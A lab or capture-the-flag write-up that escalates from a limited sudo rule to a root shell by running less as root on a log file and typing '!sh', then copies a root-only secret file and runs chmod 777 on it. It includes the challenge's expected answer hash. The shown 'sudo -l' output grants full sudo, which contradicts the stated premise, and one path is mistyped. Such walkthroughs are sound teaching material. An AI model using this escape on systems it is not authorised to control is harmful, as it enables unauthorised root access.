## "La Rinconada": Elevating privileges

### Problem

Description: You are logged in as the user "admin" without general "sudo" privileges.
The system administrator has granted you limited "sudo" access; this was intended to allow you to read log files.

Your mission is to find a way to exploit this limited sudo permission to gain a full root shell and read the secret file at /root/secret.txt
Copy the content of /root/secret.txt into the /home/admin/solution.txt file, for example: cat /root/secret.txt > /home/admin/solution.txt (the "admin" user must be able to read the file).

Root (sudo) Access: False

Test: As the user "admin", md5sum /home/admin/solution.txt returns 52a55258e4d530489ffe0cc4cf02030c (we also accept the hash of the same secret string without an ending newline).

### Solution

#### 1. list what sudo permissions the admin has

We can run the `less` command as `root` if the first argument is `/var/log/*`.

```
admin@i-0adfc7a1f5cd64cfb:~$ sudo -l
Matching Defaults entries for admin on i-0adfc7a1f5cd64cfb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User admin may run the following commands on i-0adfc7a1f5cd64cfb:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/less /var/log/*
```

#### 2. Interactive shell from within less

1. Open any log file as root (no password required):

```
sudo less /var/log/cloud-init.log
```

2. Inside less, type the following and press Enter:

```
!sh
```

3. copy /root/secret.txt to /home/admin.solution.txt

```
# cd /root/   
# ls
secret.txt
# cp secret.txt /home/admin/solution.txt
# cat secret.txt
<detached>
# cd /home/admin/agent
# ls
check.sh  sadagent  sadagent.txt
# ./check.sh
OK#
# cd /home/admin
# chmod 777 solution.txt // allow the check script to read this file
```
